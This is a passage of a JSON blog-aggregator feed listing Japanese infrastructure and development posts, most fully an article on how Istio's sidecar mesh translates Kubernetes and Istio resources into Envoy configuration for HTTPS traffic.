Registry。","isoDate":"2024-03-14T15:13:39.000Z","dateMiliSeconds":1710429219000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"生成AI入門","link":"https://speakerdeck.com/shukob/sheng-cheng-airu-men","contentSnippet":"今話題の生成AIについて簡単に技術概要をお話ししたのち、LangChain、プロンプトエンジニアリング、RAG（Retrieval Augmented Generation）、Embedding、グラウンディングなどを実装の手法などを紹介しました。","isoDate":"2024-03-02T05:00:00.000Z","dateMiliSeconds":1709355600000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Google Cloud Managed Service for Prometheusでprismaメトリクスを可視化してみた","link":"https://speakerdeck.com/kojake_300/google-cloud-managed-service-for-prometheusteprismametorikusuwoke-shi-hua-sitemita","contentSnippet":"","isoDate":"2024-02-29T05:00:00.000Z","dateMiliSeconds":1709182800000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"Reckoner の Scala プロジェクトにおける オブザーバビリティの取り組み / Observability Initiatives in Reckoner\'s Scala Project","link":"https://speakerdeck.com/nomadblacky/reckoner-no-scala-puroziekutoniokeru-obuzababiriteinoqu-rizu-mi","contentSnippet":"2024/02/27 Scalaわいわい勉強会 #2\\rhttps://scala-tokyo.connpass.com/event/307069/","isoDate":"2024-02-27T05:00:00.000Z","dateMiliSeconds":1709010000000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"Azure Container Apps Jobs を Self-hosted GitHub Actions Runner として使う","link":"https://blog.1q77.com/2024/02/container-apps-jobs-self-hosted-github-actions-runner/","contentSnippet":"GitHub Actions の Self-hosted Runner を安く用意する方法を探していたところ、Azure の Container Apps Jobs というのが便利に使えるらしいというのを見つけたので試してみる。チュートリアル:Azure Container Apps ジョブを使用してセルフホスト型 CI/CD ランナーとエージェントをデプロイするをなぞるだけです。","isoDate":"2024-02-23T10:05:41.000Z","dateMiliSeconds":1708682741000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"アーキテクチャから学ぶKubernetesの全体像","link":"https://speakerdeck.com/bells17/akitekutiyakaraxue-hukubernetesnoquan-ti-xiang","contentSnippet":"Developers Summit（デブサミ）2024で登壇したセッションの資料です。\\r\\r- https://event.shoeisha.jp/devsumi/20240215\\r- https://event.shoeisha.jp/devsumi/20240215/session/4777\\r\\rセッション解説記事:\\rhttps://codezine.jp/article/detail/19131","isoDate":"2024-02-15T05:00:00.000Z","dateMiliSeconds":1707973200000,"authorName":"bells17","authorId":"bells17"},{"title":"個人開発でWebアプリの開発とデプロイの流れ","link":"https://kechigon.hatenablog.com/entry/2024/02/13/125853","contentSnippet":"個人でWebサービスを開発したいけど、どのような流れで作っていけばいいのかわからない方向けです。個人開発でWebアプリを開発、デプロイをしたのでその流れを共有したいと思います。作ったもの麻雀戦績管理アプリ名付けて「PungPals」。雀荘などのオフラインでの対戦結果を残し、個人成績やランキングを確認できます。pungpals-service-xstpolfd4q-an.a.run.app開発とデプロイの流れ1.要件定義、設計実装がスムーズに進むために、しっかりとしておきましょう。以前記事を書いたので、参考にしてください。kechigon.hatenablog.com2.技術選定今回作ったアプリケーションはDjangoで開発し、Cloud Runにデプロイしています。選定理由は、Django: 経験があるから。Cloud Run: Djangoアプリのデプロイ方法の公式ドキュメントがあった(後ほど説明します)、マネージドな部分とカスタムできる部分のバランスがちょうどよかったから。でした。以下これらの技術を使って、開発デプロイまでの流れを説明していきます。3.Djangoを使ってアプリケーションを作成Djangoにはチュートリアルがあり、はじめての Django アプリ作成、その 1 | Django ドキュメント | Djangoはじめての Django アプリ作成、その2 | Django ドキュメント | Djangoはじめての Django アプリ作成、その 3 | Django ドキュメント | Djangoはじめての Django アプリ作成、その 4 | Django ドキュメント | Djangoを読めば開発方法がわかると思います。環境構築をし、実装し、ローカルで動作確認をしながら開発していきます。4.Cloud run へのデプロイDjangoアプリのCloud runへのデプロイ方法は公式ドキュメントにまとめられているので、これを見ながら進めます。cloud.google.comDjangoアプリケーションを環境に合わせて設定した後コンテナ化し、Cloud Runに載せます。それに伴い、Cloud SQL(データベース)、Secret Manager(シークレット管理)、Cloud Storage(静的アセットの保存など)、Cloud Build(CI/CD)、Artifact Registry(コンテナレジストリ)の作成、設定も行います。ドキュメントではGCRを使っていますが、現在非推奨なので、Artifact Registryをコンテナレジストリとして使用します。cloud.google.comオプションですが、GCPへのリソースの作成はTerraformを利用すると、構成管理ができ便利です。作成するインフラの図以上のことを行った後のGitHubリポジトリPungPalsのコードは公開しているので、参考にしていただければと思います。github.comこれから今後は、運用面の課題解決や集客などを行っていく予定なので、ブログにしていくつもりです！","isoDate":"2024-02-13T03:58:53.000Z","dateMiliSeconds":1707796733000,"authorName":"Kurita Keigo","authorId":"kurita"},{"title":"フロントエンドで収集するべきテレメトリは何か","link":"https://zenn.dev/kimitsu/articles/frontend-and-telemetry","contentSnippet":"先日『フロントエンド監視の全体像と実現方法』という記事を投稿しましたが、その中でテレメトリについては触れませんでした（※本記事は上記記事の内容を知らなくても読み進められるようになっています）。というのは、テレメトリは可観測性を実現するための重要な概念ではあるものの、テレメトリを軸に監視を考えるのは手段の目的化になってしまうと考えているからです。重要なのはサービスにとって何を観測するべきかを考えることであり、テレメトリはそれを設計や実装に落とし込む際に現れるものです。一方で監視に対する理解を深める上では、テレメトリを軸に考えることも重要でしょう。そこで本記事ではフロントエンド監視に...","isoDate":"2024-02-11T01:40:25.000Z","dateMiliSeconds":1707615625000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"フロントエンド監視の全体像と実現方法","link":"https://zenn.dev/kimitsu/articles/frontend-monitoring","contentSnippet":"必要性フロントエンドの監視はバックエンドやインフラのそれらと比べ、優先度が低くなりがちです。バックエンドやインフラでの障害はサービス継続に直結するため、これは当然と言えば当然なのですが、別の理由もあると考えています。それは計算リソースをサービス提供側が管理していないことです。例えばアプリケーションがインフラとして AWS を利用しているなら、AWS のリソースを管理するのはサービス提供側です。これは AWS 以外のクラウドサービスプロバイダやオンプレであっても同様です。一方でフロントエンドはエンドユーザのブラウザ上で動作し、これを管理しているのはエンドユーザです。フロン...","isoDate":"2024-02-09T09:46:56.000Z","dateMiliSeconds":1707472016000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"安全な Kubernetes 環境を目指して","link":"https://speakerdeck.com/kyohmizu/an-quan-na-kubernetes-huan-jing-womu-zhi-site","contentSnippet":"Kubernetes Novice Tokyo #30 の登壇資料です。2024/02/08\\rhttps://k8s-novice-jp.connpass.com/event/300441/","isoDate":"2024-02-08T05:00:00.000Z","dateMiliSeconds":1707368400000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"YugabyteDB ManagedのAlways Free枠を試そう","link":"https://zenn.dev/nnaka2992/articles/play_with_yugabytedb_managed_sandbox","contentSnippet":"YugabyteDB Managedにフリートライアルがあるのは知っていたのですが、期間が限られたものしか無いと思っていました。YugabyteDBについて調べごとをしていたら機能制限はあるもののSandboxクラスターというクレジットカード登録すら不要でAlways Freeな利用枠があることを知りました。いままでローカルでYugabyteDBを建てたりminikube上で遊んでいたのですが、簡単な検証であればSandboxクラスターで十分です。この記事ではそんなYugabyteDB ManagedのSandboxクラスターを紹介します。 Sandbox Clusterの制限...","isoDate":"2024-02-04T15:02:28.000Z","dateMiliSeconds":1707058948000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"renovate で CircleCI の terraform_version を更新する","link":"https://blog.1q77.com/2024/02/update-terraform-version-in-circleci-with-renovate/","contentSnippet":"課題Circle CI の terraform Orb でterraform の version を指定するには次のようにしますが、この terraform_version の値に変数を使うことが出来ず、tf ファイルや .tool-versions から読み出した値を使うことが出来ませんでした。","isoDate":"2024-02-04T10:37:36.000Z","dateMiliSeconds":1707043056000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Controllerを作ってみよう~ Kubernetes Controllerハンズオン ~","link":"https://speakerdeck.com/bells17/controllerwozuo-tutemiyou-kubernetes-controllerhansuon","contentSnippet":"イベントURL: https://k8s-novice-jp.connpass.com/event/300442/\\r参考リポジトリ: https://github.com/bells17/k8s-controller-example\\r\\rその他リンク:\\r\\rhttps://github.com/kubernetes/sample-controller\\rhttps://github.com/kubernetes/kubernetes/blob/v1.29.1/pkg/controller/clusterroleaggregation/clusterroleaggregation_controller.go\\rhttps://github.com/kubernetes/client-go/tree/v12.0.0\\rhttps://github.com/kubernetes/client-go/blob/v12.0.0/tools/cache/reflector.go\\rhttps://github.com/kubernetes/client-go/tree/v12.0.0/informers\\rhttps://github.com/kubernetes/client-go/blob/v12.0.0/tools/cache/store.go\\rhttps://github.com/kubernetes/client-go/blob/v12.0.0/tools/cache/delta_fifo.go\\rhttps://github.com/kubernetes/client-go/blob/v12.0.0/util/workqueue/rate_limiting_queue.go","isoDate":"2024-01-30T05:00:00.000Z","dateMiliSeconds":1706590800000,"authorName":"bells17","authorId":"bells17"},{"title":"Mac に Homebrew で docker pluings をインストールする","link":"https://blog.1q77.com/2024/01/install-docker-plugins-on-mac/","contentSnippet":"Homebrew で plugin をインストールDocker Desktop for Mac であれば何もしなくても docker compose コマンドは使えるようになっているのですが、Lima で docker を使っている場合などで Homebrew で docker をインストールしていると docker compose や docker buildx を使えるようにするためには追加でのインストールが必要でした。","isoDate":"2024-01-26T12:36:56.000Z","dateMiliSeconds":1706272616000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"限定公開のGKE上でセキュアなGithub Actionsのrunnerを構築","link":"https://zenn.dev/kojake_300/articles/7be501d3fc4e72","contentSnippet":"モチベーションGithub Actionsのセルフホストランナーでは、long pollingによりrunner側でingressのfirewallを設定せずにrunnerをデプロイ出来るというのを最近知ったので、GKEで検証していこうと思います。 構成ざっくりですがこんな感じ。GKEは限定公開のクラスタとして構築し、踏み台サーバからGKEにリクエストを送ります。Github Actionsとの通信のためにVPCにはCloud NATをアタッチします。 前提条件terraformで構築するため、予めインストールしておくこと。(検証はv1.0.0) 構築手順...","isoDate":"2024-01-24T11:08:37.000Z","dateMiliSeconds":1706094517000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"K8sGPT: Prometheus Analyzers","link":"https://zenn.dev/tozastation/articles/71015cc5b95b4e","contentSnippet":"v0.3.26 からPrometheus の Analyzer がリリースされましたデモ映像はこちらhttps://github.com/k8sgpt-ai/k8sgpt/pull/855本PR作成者の Daniel Clark さんは Google の方 (2024/01/18時点)で，prometheus-engine (Cloud Managed Service for Prometheus (GMP)) に多くのコントリビューションをされています． 先にまとめPrometheus Analyzer には現在二つの機能が含まれるConfig Analyzer ...","isoDate":"2024-01-23T03:00:00.000Z","dateMiliSeconds":1705978800000,"authorName":"tozastation","authorId":"tozastation"},{"title":"openssl s_client で SMTP 認証","link":"https://blog.1q77.com/2024/01/smtp-auth-plain-with-openssl-command/","contentSnippet":"Amazon SES での SMTP 認証情報の確認をしたいAmazon SES で SMTP を使ってメール送信したい場合、IAM User の credentials をちょいと加工してやる必要があります。Amazon SES SMTP 認証情報を取得","isoDate":"2024-01-23T02:44:23.000Z","dateMiliSeconds":1705977863000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"【Istio⛵️】Istioによって抽象化されるEnvoyのHTTPSリクエスト処理の仕組み","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2024/01/16/013404","contentSnippet":"この記事から得られる知識この記事を読むと、以下を \\"完全に理解\\" できます✌️Istioのサイドカーメッシュを題材にしたEnvoyの設定の抽象化について様々なサービスメッシュツール (特に、Istio、Consul、Ciliumなど) でも流用できるEnvoyの知識についてこの記事から得られる知識01. はじめに02. 様々なリソースによるEnvoy設定の抽象化サービスメッシュ外からのHTTPSマイクロサービス間のHTTPSサービスメッシュ外へのHTTPS03. istio-proxyコンテナによるHTTPS処理Istioコントロールプレーンの仕組みサービスメッシュ外からのHTTPSマイクロサービス間のHTTPSサービスメッシュ外へのHTTPS04. EnvoyによるHTTPS処理Envoyの設定の種類フィルターフィルターの一覧フィルターチェーンの仕組み05. リソースの設定からEnvoy設定への翻訳各リソースとEnvoyの設定の関係一覧サービスメッシュ外からのHTTPSEnvoyの設定を抽象化するリソース一覧リソースとEnvoyの設定の対応関係istio-proxyコンテナ内のEnvoyに当てはめるマイクロサービス間のHTTPSEnvoyの設定を抽象化するリソース一覧リソースとEnvoyの設定の対応関係istio-proxyコンテナ内のEnvoyに当てはめるサービスメッシュ外へのHTTPSEnvoyの設定を抽象化するリソース一覧リソースとEnvoyの設定の対応関係istio-proxyコンテナ内のEnvoyに当てはめる06. 翻訳されたEnvoy設定値を見てみるEnvoyの現在の設定を出力するリスナーを出力するルートを出力するクラスターを出力するエンドポイントを出力する証明書を出力するサービスメッシュ外からのHTTPS送信元Pod側のistio-proxyコンテナ宛先Pod側のistio-proxyコンテナマイクロサービス間のHTTPS送信元Pod側のistio-proxyコンテナ宛先Pod側のistio-proxyコンテナサービスメッシュ外へのHTTPS送信元Pod側のistio-proxyコンテナ宛先Pod (Istio EgressGateway Pod) 側のistio-proxyコンテナ07. おわりに謝辞記事関連のおすすめ書籍01. はじめにどうも、俺 (REMIX) feat. Istioニキ a.k.a. いすてぃ男です。Istioは、Envoyを使用したサービスメッシュを実装します。IstioがKubernetesリソースやIstioカスタムリソースに基づいてEnvoyの設定を抽象化してくれるため、開発者はEnvoyをより簡単に設定できます。Envoyの設定の抽象化は、Envoyを使用したサービスメッシュ (例：Istioサイドカーメッシュ/アンビエントメッシュ、Consul、Istioから得られた学びを土台に登場したCiliumサイドカーフリーメッシュなど) に共通しています。つまり、次々に登場するEnvoyによるサービスメッシュツールに振り回されないようにするためには、ツールがどのようにEnvoyを抽象化するのかを理解しておく必要があります。そこで今回は、IstioサイドカーメッシュがEnvoyのHTTPSリクエストの処理をどのように抽象化するのかを解説します。また、抽象化されたEnvoyがHTTPSリクエストを処理する仕組みも一緒に解説します。これらの知識は、様々なサービスメッシュツールで流用できるはずです。それでは、もりもり布教していきます\uD83D\uDE1702. 様々なリソースによるEnvoy設定の抽象化まずは、どのようなリソースがHTTPSリクエストの処理に関係しているのかを、HTTPSリクエストの方向に分けて解説していきます。istio-proxyコンテナやEnvoyについては、次章以降で解説します。サービスメッシュ外からのHTTPSサービスメッシュ外から内にHTTPSリクエストを送信する場合、リソースが以下の順で紐付き、Envoyの設定を抽象化します。flowchart TD    送信元 -.->|HTTPS| Gateway    Gateway([⛵️ Gateway]) -.-> VirtualService    VirtualService([⛵️ VirtualService]) -.-> DestinationRule    DestinationRule([⛵️ DestinationRule]) -.-> Service    Service([☸️ Service]) -.-> Endpoints    Endpoints([☸️ Endpoints]) -.->|HTTPS| 宛先    classDef sly fill: #CCFFFF, stroke: black;    class 送信元 sly    classDef yellow fill: #FFFF88, stroke: black;    class 宛先 yellow    classDef blue fill: #326CE5, color: white, stroke: black;    class Gateway,VirtualService,DestinationRule,Service,Endpoints blue各リソースは、以下の仕組みで、HTTPSリクエストを送信元から宛先まで届けます。図中の番号に沿って、通信の仕組みを解説します。クライアントは、サービスメッシュ外からL7ロードバランサーにHTTPSリクエストを送信します。L7ロードバランサーは、Istio IngressGateway PodにHTTPSリクエストを送信します。もちろん、クラスター外からIstio IngressGateway PodにHTTPリクエストを送信するために、Service (例：NodePort Service) が必要です。Istio IngressGateway Podは、宛先Podとの間で相互TLS認証を実施します。Istio IngressGateway Podは、Kubernetesリソース (Service、Endpoints) やIstioカスタムリソース (VirtualService、DestinationRule) に応じて、HTTPSリクエストを宛先PodにL7ロードバランシングします。Istio Ingress vs. Kubernetes Ingress – Daniel Watrous on Software and Cloud Engineeringマイクロサービス間のHTTPSサービスメッシュ内のPodから別のPodにHTTPSリクエストを送信する場合、リソースが以下の順で紐付き、Envoyの設定を抽象化します。flowchart TD    送信元 -.->|HTTPS| VirtualService    VirtualService([⛵️ VirtualService]) -.-> DestinationRule    DestinationRule([⛵️ DestinationRule]) -.-> Service    Service([☸️ Service]) -.-> Endpoints    Endpoints([☸️ Endpoints]) -.->|HTTPS| 宛先    classDef sly fill: #CCFFFF, stroke: black;    class 送信元 sly    classDef yellow fill: #FFFF88, stroke: black;    class 宛先 yellow    classDef blue fill: #326CE5, color: white, stroke: black;    class VirtualService,DestinationRule,Service,Endpoints blue各リソースは、以下の仕組みで、HTTPSリクエストを送信元から宛先まで届けます。図中の番号に沿って、通信の仕組みを解説します。送信元Podは、宛先Podとの間で相互TLS認証を実施します。送信元Podは、Kubernetesリソース (Service、Endpoints) やIstioカスタムリソース (VirtualService、DestinationRule) の設定に応じて、HTTPSリクエストを宛先PodにL7ロードバランシングします。Istio流量管理实现机制深度解析-赵化冰的博客 | Zhaohuabing Blog▶︎ サービスメッシュ内のPod間通信にkube-proxyは必要なのかistio-initコンテナは、istio-iptablesコマンドを実行し、iptablesのルールを書き換えます (本記事3章参照) 。これにより、送信元Podから宛先Podに直接通信できるようになります。Tracing network path in Istio. Istio is among the most widely used… | by Bikram Gupta | Mediumサービスメッシュ外へのHTTPSサービスメッシュ内のPodから外のシステム (例：データベース、ドメインレイヤー委譲先の外部API) にHTTPSリクエストを送信する場合、リソースが以下の順で紐付き、Envoyの設定を抽象化します。複数のVirtualServiceとDestinationが登場するため、これらには便宜上 X と Y をつけています。flowchart TD    送信元 -.->|HTTPS| VirtualServiceX    VirtualServiceX([⛵️ VirtualService X]) -.-> DestinationRuleX    DestinationRuleX([⛵️ DestinationRule X]) -.-> Service    Service([☸️ Service]) -.-> Endpoints    Endpoints([☸️ Endpoints]) -.-> Gateway    Gateway([⛵️ Gateway]) -.-> VirtualServiceY    VirtualServiceY([⛵️ VirtualService Y]) -.-> DestinationRuleY    DestinationRuleY([⛵️ DestinationRule Y]) -.-> ServiceEntry    ServiceEntry([⛵️ ServiceEntry]) -.->|HTTPS| 宛先    classDef sly fill: #CCFFFF, stroke: black;    class 送信元 sly    classDef yellow fill: #FFFF88, stroke: black;    class 宛先 yellow    classDef blue fill: #326CE5, color: white, stroke: black;    class Gateway,VirtualServiceX,VirtualServiceY,DestinationRuleX,DestinationRuleY,Service,Endpoints,ServiceEntry blue各リソースは、以下の仕組みで、HTTPSリクエストを送信元から宛先まで届けます。図中の番号に沿って、通信の仕組みを解説します。送信元Podは、HTTPSリクエストの宛先がServiceEntryでエントリ済みか否かの設定に応じて、HTTPSリクエストの宛先を切り替えます。宛先がエントリ済みであれば、送信元PodはHTTPSリクエストの宛先にIstio EgressGateway Podを選択します。宛先が未エントリであれば、送信元PodはHTTPSリクエストの宛先に外のシステムを選択します。送信元Podは、Istio EgressGateway Podとの間で相互TLS認証を実施します。(1) で宛先がエントリ済であったとします。送信元Podは、HTTPSリクエストの向き先をIstio EgressGateway Podに変更します。送信元Podは、Kubernetesリソース (Service、Endpoints) やIstioカスタムリソース (VirtualService、DestinationRule) の設定に応じて、Istio EgressGateway PodにL7ロードバランシングします。Istio EgressGateway Podは、HTTPSリクエストをエントリ済システムにL7ロードバランシングします。Using Istio to MITM our users’ traffic | Steven ReitsmaIngress, egress, ServiceEntry DATA Flow issues for ISTIO API Gateway? - Discuss Istio▶︎ Istio EgressGatewayの必要性についてistio-proxyコンテナを経由せずに外部システムに直接HTTPSリクエストを送信できるようになってしまい、システムの安全性が低くなります。他に、サービスメッシュ外への特定の通信を識別できるようになるメリットもあります。Istio / Accessing External ServicesIstio / Egress Gateway Performance Investigation03. istio-proxyコンテナによるHTTPS処理前章では、KubernetesリソースやIstioカスタムリソースによって抽象化されたEnvoyまで言及しませんでした。本章では、解説をもう少し具体化します。Istioは、Envoyプロセスを持つistio-proxyコンテナを作成します。このistio-proxyコンテナを使用してどのようにHTTPSリクエストを処理しているのかを、HTTPSリクエストの方向に分けて解説します。Envoyの設定については、次章以降で解説します。Istioコントロールプレーンの仕組みEnvoyの設定を抽象化する責務を担うのは、Istioコントロールプレーン (discoveryコンテナ) です。Istioコントロールプレーンは異なる責務を担う複数のレイヤーから構成されています。レイヤー名      責務    Config ingestionレイヤー            kube-apiserverからKubernetesリソースやIstioカスタムリソースの設定を取得します。Istioの初期から名前は変わっていません。          Config translationレイヤー                   リソースの設定をEnvoy設定に変換します。Istioの初期ではConfig Data Modelレイヤーという名前で、執筆時点 (2024/01/16) で名前が変わっています。          Config servingレイヤー            Envoyの設定や証明書をPod内のistio-proxyコンテナに配布します。Istioの初期では、Proxy Servingレイヤーという名前で、執筆時点 (2024/01/16) で名前が変わっています。          図中の番号に沿って、Istioコントロールプレーンの仕組みを解説します。Config ingestionレイヤーにて、 Istioコントロールプレーンはkube-apiserverにHTTPSリクエストを送信します。ここで、KubernetesリソースやIstioカスタムリソースの設定を取得します。Config translationレイヤーにて、取得したリソースの設定をEnvoyの設定に変換します。Config servingレイヤーにて、Envoyの設定や証明書をPod内のistio-proxyコンテナに配布します。双方向ストリーミングRPCのため、istio-proxyコンテナがConfig servingレイヤーにリクエストを送信し、これらを取得することもあります。istio/architecture/networking/pilot.md at 1.20.2 \xb7 istio/istio \xb7 GitHubhttps://www.zhaohuabing.com/post/2020-05-25-istio-certificate/▶︎ Config servingレイヤーにあるXDS-APIについて▶︎ Istioカスタムリソースのコントローラーについてistio/architecture/networking/pilot.md at 1.20.2 \xb7 istio/istio \xb7 GitHubサービスメッシュ外からのHTTPSサービスメッシュ外から内にHTTPSリクエストを送信する場合のistio-proxyコンテナです。各リソースは、以下の仕組みで、HTTPSリクエストを送信元から宛先まで届けます。図中の番号に沿って、通信の仕組みを解説します。Istioコントロールプレーンは、翻訳されたEnvoyの設定をPod内のistio-proxyコンテナに提供します。クライアントは、サービスメッシュ外からL7ロードバランサーにHTTPSリクエストを送信します。L7ロードバランサーは、Istio IngressGateway PodにHTTPSリクエストを送信します。もちろん、クラスター外からIstio IngressGateway PodにHTTPリクエストを送信するために、Service (例：NodePort Service) が必要です。Istio IngressGateway Pod内のiptablesは、HTTPSリクエストをistio-proxyコンテナに送信します (リダイレクトは不要)。Istio IngressGateway Pod内のistio-proxyコンテナは、宛先Podを決定し、またこのPodに対して相互TLS認証を実施します。Istio IngressGateway Pod内のistio-proxyコンテナは、HTTPSリクエストを宛先PodにL7ロードバランシングします。宛先Pod内のiptablesは、HTTPSリクエストをistio-proxyコンテナにリダイレクトします。宛先Pod内のistio-proxyコンテナは、HTTPSリクエストを宛先マイクロサービスに送信します。Istio Ingress vs. Kubernetes Ingress – Daniel Watrous on Software and Cloud Engineering▶︎ Pod内のiptablesについてistio-proxyコンテナを経由するように、istio-proxyコンテナにリクエストをリダイレクトします。iptablesのルールを書き換えるのはistio-initコンテナです。Istioは、istio-proxyコンテナと同じタイミングで、istio-initコンテナをPodにインジェクションします (Istio IngressGatewayとIstio EgressGatewayのPodは除きます)。画像引用元：SoByteistio-initコンテナは、istio-iptablesコマンドを実行し、iptablesのルールを書き換えます。また、istio-initコンテナはルールを書き換えた後に終了するため、Podの起動後にPod内に残りません\uD83D\uDC4D\uD83C\uDFFB$ pilot-agent istio-iptables \\\\    -p 15001 \\\\    -z 15006 \\\\    -u 1337 \\\\    -m REDIRECT \\\\    -i * \\\\    -x \\\\    -b * \\\\    -d 15090,15020Sidecar injection, transparent traffic hijacking, and routing process in Istio explained in detail | by Jimmy Song | MediumIstio / pilot-agent▶︎ Istio IngressGateway Pod内のiptablesについてistio-proxyコンテナにリクエストをリダイレクトする必要がありません。そのため、Istioはiptablesのルールを書き換えるistio-initコンテナをIstio IngressGateway Podにインジェクションしません。つまり、Istio IngressGateway Pod内のiptablesのルールはデフォルトのままになっています\uD83D\uDC4D\uD83C\uDFFBマイクロサービス間のHTTPSサービスメッシュ内のPodから別のPodにHTTPSリクエストを送信する場合のistio-proxyコンテナです。各リソースは、以下の仕組みで、HTTPSリクエストを送信元から宛先まで届けます。図中の番号に沿って、通信の仕組みを解説します。Istioコントロールプレーンは、翻訳されたEnvoyの設定をPod内のistio-proxyコンテナに提供します。送信元Pod内のiptablesは、HTTPSリクエストをistio-proxyコンテナにリダイレクトします。送信元Pod内のistio-proxyコンテナは、宛先Podを決定し、またこのPodに対して相互TLS認証を実施します。送信元Pod内のistio-proxyコンテナは、HTTPSリクエストを宛先PodにL7ロードバランシングします。宛先Pod内のiptablesは、HTTPSリクエストをistio-proxyコンテナにリダイレクトします。宛先Pod内のistio-proxyコンテナは、HTTPSリクエストを宛先マイクロサービスに送信します。Istio流量管理实现机制深度解析-赵化冰的博客 | Zhaohuabing Blogサービスメッシュ外へのHTTPSサービスメッシュ内のPodから外のシステム (例：データベース、ドメインレイヤー委譲先の外部API) にHTTPSリクエストを送信する場合のistio-proxyコンテナです。各リソースは、以下の仕組みで、HTTPSリクエストを送信元から宛先まで届けます。図中の番号に沿って、通信の仕組みを解説します。Istioコントロールプレーンは、翻訳されたEnvoyの設定をPod内のistio-proxyコンテナに提供します。送信元Pod内のiptablesは、HTTPSリクエストをistio-proxyコンテナにリダイレクトします。送信元Pod内のistio-proxyコンテナは、宛先Podを決定し、またこのPodに対して相互TLS認証を実施します。この時、ServiceEntryで宛先がエントリ済みか否かに応じて、HTTPSリクエストの宛先を切り替えます。宛先がエントリ済みであれば、istio-proxyコンテナはHTTPSリクエストの宛先にIstio EgressGateway Podを選択します。宛先が未エントリであれば、istio-proxyコンテナはHTTPSリクエストの宛先に外のシステムを選択します。ここでは、宛先がエントリ済であったとします。送信元Pod内のistio-proxyコンテナは、HTTPSリクエストをIstio EgressGateway PodにL7ロードバランシングします。Istio EgressGateway Pod内のiptablesは、HTTPSリクエストをistio-proxyコンテナに送信します (リダイレクトは不要)。Istio EgressGateway Pod内のistio-proxyコンテナは、HTTPSリクエストをエントリ済システムにL7ロードバランシングします。▶︎ Istio EgressGateway Pod内のiptablesについてistio-proxyコンテナにリクエストをリダイレクトする必要がありません。そのため、Istioはiptablesのルールを書き換えるistio-initコンテナをIstio EgressGateway Podにインジェクションしません。つまり、Istio EgressGateway Pod内のiptablesのルールはデフォルトのままになっています\uD83D\uDC4D\uD83C\uDFFBUsing Istio to MITM our users’ traffic | Steven ReitsmaIngress, egress, ServiceEntry DATA Flow issues for ISTIO API Gateway? - Discuss Istio04. EnvoyによるHTTPS処理前章では、istio-proxyコンテナ内のEnvoyの設定まで、言及しませんでした。本章では、もっと具体化します。EnvoyがHTTPSリクエストを処理する仕組みを解説します。Envoyの設定の種類HTTPSリクエストを処理する場合、Envoyの設定が以下の順で紐付き、HTTPSリクエストを送信元から宛先まで届けます。flowchart TD    送信元 -.->|HTTPS| リスナー    リスナー(リスナー) -.-> リスナーフィルター    subgraph  \\"\\"      リスナーフィルター(リスナーフィルター) -.-> ネットワークフィルター      ネットワークフィルター(ネットワークフィルター) -.-> HTTPフィルター    end    HTTPフィルター(HTTPフィルター) -.-> ルート    ルート(ルート) -.-> クラスター    クラスター(クラスター) -.-> エンドポイント    エンドポイント(エンドポイント) -.->|HTTPS| 宛先classDef sly fill: #CCFFFF, stroke: black;class 送信元 slyclassDef yellow fill: #FFFF88, stroke: black;class 宛先 yellowclassDef red fill: #EA6B66, font-weight :bold, stroke: black;class リスナー,リスナーフィルター,ネットワークフィルター,HTTPフィルター,ルート,クラスター,エンドポイント red各処理がどのような責務を担っているのかをもう少し詳しく見てみましょう。図中の番号に沿って、EnvoyがHTTPSリクエストを処理する仕組みを解説します。送信元からのHTTPSリクエストの宛先ポートで、リスナーを絞り込みます。通信の種類 (例：HTTP、HTTPS、TCP、UDP、Unixドメインソケットなど) に応じてフィルターを選び、各フィルターがパケットのヘッダーを処理します。もしHTTPSであれば、送信元との間でTLS接続を確立し、パケットのL7のアプリケーションデータを復号化します。フィルターを使用して、HTTPSリクエストの宛先ポートで、ルートを絞り込みます。フィルターを使用して、HTTPSリクエストの宛先ホストやパスで、クラスターを絞り込みます。設定した負荷分散方式 (例：ラウンドロビンなど) に応じて、クラスター配下のエンドポイントを選びます。宛先との間でTLS接続を確立し、パケットのL7のアプリケーションデータを暗号化します。そして、エンドポイントにL7ロードバランシングします。Life of a Request — envoy 1.36.0-dev-64cb65 documentation▶ TCPリクエストを処理する場合についてflowchart TD    送信元 -.->|TCP| リスナー    リスナー(リスナー) -.-> リスナーフィルター    subgraph  \\"\\"      リスナーフィルター(リスナーフィルター) -.-> ネットワークフィルター    end    ネットワークフィルター(ネットワークフィルター) -.-> クラスター    クラスター(クラスター) -.-> エンドポイント    エンドポイント(エンドポイント) -.->|TCP| 宛先classDef sly fill: #CCFFFF, stroke: black;class 送信元 slyclassDef yellow fill: #FFFF88, stroke: black;class 宛先 yellowclassDef red fill: #EA6B66, font-weight :bold, stroke: black;class リスナー,リスナーフィルター,ネットワークフィルター,クラスター,エンドポイント redDebugging Your Debugging Tools: What to do When Your Service Mesh Goes Down | PPTX | Internet | Computingフィルターフィルターの一覧Envoyのフィルターは、Envoyの機能を拡張するための設定です。HTTPSリクエストを処理するためには、リスナーフィルター、ネットワークフィルター、HTTPフィルター、といったフィルターが必要になります。全ては解説しきれないため、HTTPSリクエストを処理するための代表的なフィルターをいくつか抜粋しました。ただ、 Istioはこれらのフィルターをデフォルトで有効にしてくれている ため、開発者がEnvoyのフィルターを設定する場面は少ないです。逆をいえば、Istioを介さずにEnvoyをそのまま使用する場合、開発者がEnvoyのフィルターを自前で設定する必要があります\uD83D\uDC4D\uD83C\uDFFBフィルターの種類      HTTPSリクエストの処理に必要なフィルター(一部抜粋)      説明    リスナーフィルター      Original Destination      istio-proxyコンテナへのリダイレクト前の宛先情報をEnvoyが取得できるようにします。Pod内のiptablesがHTTPSリクエストをistio-proxyコンテナにリダイレクトすると、HTTPSリクエストの宛先がistio-proxyコンテナに変わってしまいます。ただし、iptablesはリダイレクト前の宛先をカーネル上のSO_ORIGINAL_DSTという定数に格納してくれています。Envoyは、カーネル上のSO_ORIGINAL_DSTから本来の宛先を取得し、プロキシします。    HTTP Inspector      